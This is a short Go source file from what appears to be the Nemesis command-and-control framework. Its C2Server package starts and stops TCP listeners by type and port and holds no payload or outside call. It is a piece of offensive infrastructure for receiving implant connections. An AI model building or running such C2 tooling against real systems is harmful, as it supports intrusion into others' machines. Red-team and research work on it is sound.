package C2Server

import (
	"github.com/nemesisdev2000/Nemesis/Listeners/TcpListener"
)

func Call(port string, fn func(string) interface{}) interface{} {
	result := fn(port)
	return result
}

func Listen(port string, ltype string) interface{} {
	m := map[string]func(string) interface{}{
		"TcpListener": TcpListener.StartListener,
	}

	c := Call(port, m[ltype])
	//return c
	return c
}

func Stop(id string) {
	TcpListener.StopListener(id)
	return
}
